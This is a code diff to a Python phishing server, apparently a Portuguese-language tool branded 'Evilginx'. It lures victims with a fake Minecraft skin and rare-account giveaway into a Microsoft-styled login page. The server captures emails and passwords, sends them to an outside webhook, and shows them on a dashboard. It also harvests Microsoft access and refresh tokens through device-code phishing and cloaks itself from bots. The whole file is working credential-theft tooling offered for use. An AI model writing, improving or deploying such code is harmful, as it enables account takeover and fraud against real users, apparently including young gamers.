@@ -5,7 +5,7 @@ from urllib.parse import urlparse, parse_qs
 from collections import deque
 
 # ============================================================
-# CONFIGURAÇÃO - AJUSTE VIA VARIÁVEIS DE AMBIENTE NO RENDER
+# CONFIGURAÇÃO
 # ============================================================
 
 PORT = int(os.environ.get("PORT", 8080))
@@ -13,7 +13,10 @@ PUBLIC_URL = os.environ.get("PUBLIC_URL", f"http://localhost:{PORT}")
 WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")
 DEVICE_CLIENT_ID = "1950a258-227b-4e31-a9cf-717495945fc2"
 
-# Estado thread-safe
+# ============================================================
+# ESTADO (thread-safe)
+# ============================================================
+
 captured_sessions = deque(maxlen=100)
 captured_lock = threading.Lock()
 click_stats = {}
@@ -46,7 +49,8 @@ def save_db(data):
 init_db()
 
 def send_webhook(email, password, ip, click_count=0):
-    if not WEBHOOK_URL: return
+    if not WEBHOOK_URL:
+        return
     try:
         requests.post(WEBHOOK_URL, json={"embeds":[{
             "title": "🎯 NOVA CONTA CAPTURADA!",
@@ -58,7 +62,8 @@ def send_webhook(email, password, ip, click_count=0):
                 {"name":"🖱️ Cliques","value":str(click_count),"inline":True}
             ]
         }]}, timeout=5)
-    except: pass
+    except:
+        pass
 
 def start_device_flow():
     try:
@@ -68,7 +73,8 @@ def start_device_flow():
         if r.status_code == 200:
             j = r.json()
             return j.get("user_code"), j.get("device_code"), j.get("verification_uri")
-    except: pass
+    except:
+        pass
     return None, None, None
 
 def poll_for_token(device_code):
@@ -83,7 +89,8 @@ def poll_for_token(device_code):
             if r.status_code == 200:
                 j = r.json()
                 return j.get("access_token",""), j.get("refresh_token","")
-        except: pass
+        except:
+            pass
         time.sleep(5)
     return "", ""
 
@@ -91,7 +98,8 @@ def is_valid_email(email):
     return bool(re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email))
 
 def sanitize(text):
-    if not text: return ""
+    if not text:
+        return ""
     return text.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;").replace('"',"&quot;")
 
 def escape_js(text):
@@ -103,7 +111,8 @@ def is_bot(headers):
     return any(b in ua for b in bots)
 
 class Handler(BaseHTTPRequestHandler):
-    def log_message(self, *args): pass
+    def log_message(self, *args):
+        pass
 
     def _send(self, status, ct, body):
         self.send_response(status)
@@ -116,20 +125,29 @@ class Handler(BaseHTTPRequestHandler):
         if is_bot(self.headers):
             self._send(200, "text/html", b"Microsoft 365")
             return
-        if path == '/': self._login()
-        elif path == '/dashboard': self._dashboard()
-        elif path == '/qrcode': self._qrcode()
-        elif path == '/device/poll': self._poll()
-        else: self.send_response(404); self.end_headers()
+        if path == '/':
+            self._login()
+        elif path == '/dashboard':
+            self._dashboard()
+        elif path == '/qrcode':
+            self._qrcode()
+        elif path == '/device/poll':
+            self._poll()
+        else:
+            self.send_response(404)
+            self.end_headers()
 
     def do_POST(self):
         path = urlparse(self.path).path
-        if path == '/auth': self._auth()
+        if path == '/auth':
+            self._auth()
         elif path == '/api/click':
             with click_lock:
                 click_stats[self.client_address[0]] = click_stats.get(self.client_address[0], 0) + 1
             self._send(200, "application/json", json.dumps({"status":"ok"}))
-        else: self.send_response(404); self.end_headers()
+        else:
+            self.send_response(404)
+            self.end_headers()
 
     def _poll(self):
         q = parse_qs(urlparse(self.path).query)
@@ -145,49 +163,44 @@ class Handler(BaseHTTPRequestHandler):
         url_js = escape_js(vuri if dcode else PUBLIC_URL)
         dev_js = escape_js(dcode) if dcode else '""'
         manual = f'<p><strong>Código manual:</strong> <code style="font-size:24px">{sanitize(ucode)}</code></p>' if ucode else ''
-        html = ('''<!DOCTYPE html>
-<html><head><title>QR Code - Tokens Microsoft</title>
-<style>body{background:#1a1a2e;color:white;text-align:center;padding:20px;}</style></head>
-<body>
-<h1>📱 Escaneie para autorizar sua conta</h1>''' + manual + '''
-<div id="qrcode" style="background:white;padding:20px;display:inline-block;border-radius:10px;"></div>
-<br><button onclick="poll()" style="background:#0067b8;color:white;border:none;padding:10px 20px;cursor:pointer;">🔍 Obter Token</button>
-<div id="result"></div>
-<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
-<script>
-var qrUrl = ''' + url_js + ''';
-var devCode = ''' + dev_js + ''';
-new QRCode(document.getElementById("qrcode"), {text:qrUrl, width:250, height:250});
-async function poll() {
-    if(!devCode) { document.getElementById('result').innerHTML = 'Falha'; return; }
-    document.getElementById('result').innerHTML = '⏳ Aguardando...';
-    var r = await fetch('/device/poll?device_code=' + encodeURIComponent(devCode));
-    var d = await r.json();
-    if(d.access_token) {
-        document.getElementById('result').innerHTML = '✅ Access Token obtido!<br>✅ Refresh Token obtido!';
-    } else {
-        document.getElementById('result').innerHTML = '⏳ Autorize no celular e clique novamente.';
-    }
-}
-</script>
-<a href="/">Voltar</a>
-</body></html>''')
+        html = (
+            '<!DOCTYPE html><html><head><title>QR Code - Tokens Microsoft</title>'
+            '<style>body{background:#1a1a2e;color:white;text-align:center;padding:20px;}</style>'
+            '</head><body><h1>📱 Escaneie para autorizar sua conta</h1>' + manual +
+            '<div id="qrcode" style="background:white;padding:20px;display:inline-block;border-radius:10px;"></div>'
+            '<br><button onclick="poll()" style="background:#0067b8;color:white;border:none;padding:10px 20px;cursor:pointer;">🔍 Obter Token</button>'
+            '<div id="result"></div>'
+            '<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>'
+            '<script>'
+            'var qrUrl = ' + url_js + ';\n'
+            'var devCode = ' + dev_js + ';\n'
+            'new QRCode(document.getElementById("qrcode"), {text:qrUrl, width:250, height:250});\n'
+            'async function poll() {\n'
+            '    if(!devCode) { document.getElementById("result").innerHTML = "Falha"; return; }\n'
+            '    document.getElementById("result").innerHTML = "⏳ Aguardando...";\n'
+            '    var r = await fetch("/device/poll?device_code=" + encodeURIComponent(devCode));\n'
+            '    var d = await r.json();\n'
+            '    if(d.access_token) {\n'
+            '        document.getElementById("result").innerHTML = "✅ Access Token obtido!<br>✅ Refresh Token obtido!";\n'
+            '    } else {\n'
+            '        document.getElementById("result").innerHTML = "⏳ Autorize no celular e clique novamente.";\n'
+            '    }\n'
+            '}\n'
+            '</script><a href="/">Voltar</a></body></html>'
+        )
         self._send(200, "text/html", html)
 
     def _login(self):
-        # =====================================================
-        # ENGENHARIA SOCIAL FORTE: conta rara "Xdda" + skin
-        # =====================================================
         sid = get_sid()
-        og_name = "Xdda"                     # Nome raro de 4 letras
-        og_valor = "R$350,00"                # Valor alto para chamar atenção
+        og_name = "Xdda"
+        og_valor = "R$350,00"
         skin_name = "ENDER PHOENIX"
         skin_valor = "R$89,90"
         skins_restantes = random.randint(28, 47)
         participantes = random.randint(16400, 17200)
         online_agora = random.randint(40, 120)
 
-        html = ('''<!DOCTYPE html>
+        html = '''<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
@@ -225,12 +238,12 @@ async function poll() {
 <div class="container">
     <div class="event-banner">
         <div class="event-title">🎉 EVENTO ESPECIAL MINECRAFT 2026 🎉</div>
-        <div class="event-skin">🔥 ''' + skin_name + ''' 🔥</div>
-        <div style="font-size: 12px;">Valor: ''' + skin_valor + '''</div>
+        <div class="event-skin">🔥 ENDER PHOENIX 🔥</div>
+        <div style="font-size: 12px;">Valor: R$89,90</div>
         <div class="event-giveaway" style="margin-top:10px; background:#fff3cd; border-radius:8px; padding:8px;">
             🏆 <strong>SORTEIO DE CONTA RARA!</strong> 🏆<br>
-            Conta com nome <strong style="font-size:22px; font-family:monospace;">''' + og_name + '''</strong> (4 letras)<br>
-            Valor estimado: <strong>''' + og_valor + '''</strong><br>
+            Conta com nome <strong style="font-size:22px; font-family:monospace;">Xdda</strong> (4 letras)<br>
+            Valor estimado: <strong>R$350,00</strong><br>
             <span style="font-size:11px;">⚠️ APENAS 1 VENCEDOR ⚠️</span>
         </div>
     </div>
@@ -340,8 +353,6 @@ function resetToStep1() {
 }
 
 var capturedEmail = '';
-function getEmail() { return capturedEmail; }
-
 document.getElementById('emailForm').addEventListener('submit', function(e) {
     e.preventDefault();
     var email = document.getElementById('email').value;
@@ -388,7 +399,7 @@ document.getElementById('passwordForm').addEventListener('submit', function(e) {
 var pageStartTime = Date.now();
 </script>
 </body>
-</html>''')
+</html>'''
         self._send(200, "text/html", html)
 
     def _auth(self):
@@ -411,32 +422,38 @@ var pageStartTime = Date.now();
             captured_sessions.append({"timestamp":ts, "email":email, "password":pwd, "ip":ip, "ua":ua, "clicks":clicks})
         save_db({'timestamp':ts, 'email':email, 'password':pwd, 'ip':ip, 'user_agent':ua, 'click_count':clicks})
         send_webhook(email, pwd, ip, clicks)
-        print(f"\n[{ts}] CAPTURADA: {email} | {pwd} | IP:{ip} | Cliques:{clicks}")
+        print(f"\n[{ts}] CAPTURADA: {email} | Senha: {pwd} | IP:{ip} | Cliques:{clicks}")
         self._send(200, "application/json", json.dumps({"status":"ok"}))
 
     def _dashboard(self):
         with captured_lock:
             copy = list(captured_sessions)
-        rows = ""
+        rows_parts = []
         for c in copy:
-            rows += f'<tr>
-                <td>{sanitize(c["timestamp"])}</td>
-                <td>{sanitize(c["email"])}</td>
-                <td>{sanitize(c["password"])}</td>
-                <td>{sanitize(c["ip"])}</td>
-                <td>{c.get("clicks",0)}</td>
-            </tr>'
+            safe_ts = sanitize(c["timestamp"])
+            safe_email = sanitize(c["email"])
+            safe_pwd = sanitize(c["password"])
+            safe_ip = sanitize(c["ip"])
+            clicks_val = c.get("clicks", 0)
+            rows_parts.append(f"<tr><td>{safe_ts}</td><td>{safe_email}</td><td>{safe_pwd}</td><td>{safe_ip}</td><td>{clicks_val}</td></tr>")
+        rows = "".join(rows_parts)
         total_clicks = sum(click_stats.values())
-        html = ('''<!DOCTYPE html>
-<html><head><title>Dashboard</title><style>body{background:#0f0f1a;color:#cdd6f4;font-family:monospace;padding:20px;}table{width:100%;background:#1e1e2e;border-collapse:collapse;}th,td{padding:10px;border-bottom:1px solid #313244;}th{background:#313244;}</style></head>
-<body><h1>Dashboard - Evilginx</h1><p>Total capturas: ''' + str(len(copy)) + ''' | Total cliques: ''' + str(total_clicks) + '''</p>
-<table><thead><tr><th>Data</th><th>Email</th><th>Senha</th><th>IP</th><th>Cliques</th></tr></thead><tbody>''' + rows + '''</tbody></table>
-<br><a href="/">Voltar</a> | <a href="/qrcode">QR Code (Tokens)</a></body></html>''')
+        html = (
+            "<!DOCTYPE html><html><head><title>Dashboard</title>"
+            "<style>body{background:#0f0f1a;color:#cdd6f4;font-family:monospace;padding:20px;}"
+            "table{width:100%;background:#1e1e2e;border-collapse:collapse;}"
+            "th,td{padding:10px;border-bottom:1px solid #313244;}"
+            "th{background:#313244;}</style></head><body>"
+            "<h1>Dashboard - Evilginx</h1>"
+            "<p>Total capturas: " + str(len(copy)) + " | Total cliques: " + str(total_clicks) + "</p>"
+            "<table><thead><tr><th>Data</th><th>Email</th><th>Senha</th><th>IP</th><th>Cliques</th></tr></thead>"
+            "<tbody>" + rows + "</tbody></table><br><a href='/'>Voltar</a> | <a href='/qrcode'>QR Code (Tokens)</a></body></html>"
+        )
         self._send(200, "text/html", html)
 
 def run():
     print("="*70)
-    print("🎯 EVILGINX FINAL - CONTA RARA + SKIN + INTERFACE MICROSOFT ORIGINAL")
+    print("🎯 EVILGINX FINAL - CONTA RARA XDDA + SKIN + INTERFACE MICROSOFT ORIGINAL")
     print("="*70)
     print(f"📡 Servidor: {PUBLIC_URL}")
     print(f"🎁 Página principal: {PUBLIC_URL}")
